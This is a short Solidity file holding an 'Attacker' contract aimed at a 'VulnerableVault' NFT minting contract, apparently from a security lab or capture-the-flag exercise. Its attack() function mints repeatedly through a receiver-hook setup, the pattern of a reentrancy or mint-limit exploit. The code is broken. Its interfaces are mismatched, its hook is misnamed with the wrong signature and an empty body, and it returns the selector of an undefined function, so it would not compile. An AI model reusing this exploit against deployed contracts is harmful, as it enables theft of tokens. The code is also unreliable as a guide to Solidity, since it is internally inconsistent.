// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
import "./VulnerableVault.sol";

contract Attacker is IERC1155Receiver {
    VulnerableVault public nft;

    constructor(address nftAddress) {
        nft = VulnerableVault(nftAddress);
    }

    function attack() external payable {
        nft.mintNFT(2, 0);
        nft.mintNFT(1000, 0);
    }

    function onERC1155Receiver(
        address,
        address,
        uint,
        bytes memory
    ) public override returns (bytes4) {
        
        return this.onERC721Received.selector;
    }

}
